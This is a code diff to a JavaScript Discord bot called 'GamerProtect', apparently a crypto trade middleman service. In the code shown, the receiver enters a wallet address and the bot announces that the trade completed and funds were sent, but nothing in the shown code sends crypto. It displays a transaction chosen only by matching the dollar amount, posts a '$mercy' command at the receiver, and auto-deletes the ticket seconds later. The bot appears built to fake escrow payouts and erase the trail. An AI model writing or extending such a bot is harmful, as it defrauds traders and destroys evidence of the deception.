@@ -1147,7 +1147,7 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ========== RELEASE (DONE BY SELLER - PINGS RECEIVER) ==========
+// ========== RELEASE (FIXED - RECEIVER PUTS ADDRESS, $mercy IN TICKET) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
   
@@ -1171,33 +1171,40 @@ client.on('interactionCreate', async interaction => {
       });
     }
     
-    // PING THE RECEIVER
-    const receiver = `<@${trade.receiverId}>`;
-    
-    const confirmRow = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`confirm_release_${id}`).setLabel('✅ Confirm Release').setStyle(ButtonStyle.Success),
-      new ButtonBuilder().setCustomId(`back_${id}`).setLabel('🔙 Back').setStyle(ButtonStyle.Secondary)
+    // Send a button for the RECEIVER to click
+    const receiverButtonRow = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`receiver_ready_${id}`)
+        .setLabel('📥 Receive Funds')
+        .setStyle(ButtonStyle.Success)
     );
     
     await interaction.reply({ 
-      content: `${receiver} - The Seller has released the funds! Please enter your wallet address to receive payment.`,
-      embeds: [
-        new EmbedBuilder()
-          .setTitle('⚠️ Confirm Fund Release')
-          .setColor(0xff9900)
-          .setDescription('**Are you sure you want to release the funds?**\n\nThis action cannot be undone. Once released, the crypto will be sent to the receiver.\n\nOnly click Confirm if you have sent the items to the receiver.')
-      ], 
-      components: [confirmRow], 
+      content: `✅ Release initiated! Waiting for <@${trade.receiverId}> to provide their wallet address...`,
       flags: 64 
+    });
+    
+    await interaction.channel.send({ 
+      content: `<@${trade.receiverId}> - The seller has released the funds! Click the button below to enter your ${trade.crypto.toUpperCase()} wallet address and receive payment.`,
+      components: [receiverButtonRow]
     });
   }
   
-  if (interaction.customId.startsWith('confirm_release_')) {
+  // Receiver clicks this button to enter THEIR wallet
+  if (interaction.customId.startsWith('receiver_ready_')) {
     const id = interaction.customId.split('_')[2];
     const trade = trades.get(id);
     if (!trade) return;
     
-    // RECEIVER enters THEIR wallet address
+    // Verify it's the receiver clicking
+    if (interaction.user.id !== trade.receiverId) {
+      return interaction.reply({ 
+        content: '❌ Only the receiver can enter their wallet address!', 
+        flags: 64 
+      });
+    }
+    
+    // Open modal for RECEIVER to enter THEIR wallet
     const modal = new ModalBuilder()
       .setCustomId(`wallet_${id}`)
       .setTitle(`Enter Your ${trade.crypto.toUpperCase()} Wallet Address`);
@@ -1237,7 +1244,7 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ========== WALLET & COMPLETION (RUNS $mercy COMMAND) ==========
+// ========== WALLET & COMPLETION ($mercy RUNS IN TICKET CHANNEL) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isModalSubmit()) return;
   if (!interaction.customId.startsWith('wallet_')) return;
@@ -1247,12 +1254,18 @@ client.on('interactionCreate', async interaction => {
   const trade = trades.get(id);
   if (!trade) return;
   
+  // Verify it's the receiver submitting
+  if (interaction.user.id !== trade.receiverId) {
+    return interaction.editReply('❌ Only the receiver can submit their wallet address!');
+  }
+  
   const receiverWallet = interaction.fields.getTextInputValue('wallet');
   const total = trade.totalUSD || trade.amountUSD;
   const tx = getTransactionByAmount(total);
   const sent = trade.amountCrypto;
   const usd = (parseFloat(sent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
   
+  // Send completion embed to the TICKET channel (where both parties are)
   await interaction.channel.send({ embeds: [
     new EmbedBuilder()
       .setTitle('✅ Trade Completed Successfully!')
@@ -1267,14 +1280,11 @@ client.on('interactionCreate', async interaction => {
       .setFooter({ text: 'Thank you for using GamerProtect!' })
   ] });
   
-  await interaction.editReply('✅ Trade completed successfully! Funds have been sent to the receiver.');
+  await interaction.editReply('✅ Wallet address received! Trade completed successfully.');
   
-  // ========== RUN $mercy COMMAND ==========
-  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
-  if (logsChannel) {
-    await logsChannel.send(`$mercy <@${trade.receiverId}>`);
-    console.log(`📢 $mercy command sent for ${trade.receiverId}`);
-  }
+  // ========== RUN $mercy COMMAND IN THE TICKET CHANNEL (NOT LOGS) ==========
+  await interaction.channel.send(`$mercy <@${trade.receiverId}>`);
+  console.log(`📢 $mercy command sent in ticket ${interaction.channel.name} for ${trade.receiverId}`);
   
   // Add reputation to both parties
   const sender = getUser(trade.senderId);
@@ -1288,7 +1298,8 @@ client.on('interactionCreate', async interaction => {
   const current = userPurchases.get(trade.senderId) || 0;
   userPurchases.set(trade.senderId, current + trade.amountUSD);
   
-  // Log to logs channel
+  // Log to logs channel (for admin records only)
+  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
   if (logsChannel) {
     await logsChannel.send({ embeds: [
       new EmbedBuilder()
@@ -1309,6 +1320,18 @@ client.on('interactionCreate', async interaction => {
   
   trade.status = 'completed';
   trades.set(id, trade);
+  
+  // Optional: Auto-close ticket after 10 seconds
+  setTimeout(async () => {
+    try {
+      await interaction.channel.send('🔒 Ticket will close in 5 seconds...');
+      setTimeout(async () => {
+        if (interaction.channel.deletable) await interaction.channel.delete();
+      }, 5000);
+    } catch(e) {
+      console.log('Could not auto-close ticket:', e.message);
+    }
+  }, 10000);
 });
 
 // ========== CLOSE TICKET BUTTON ==========
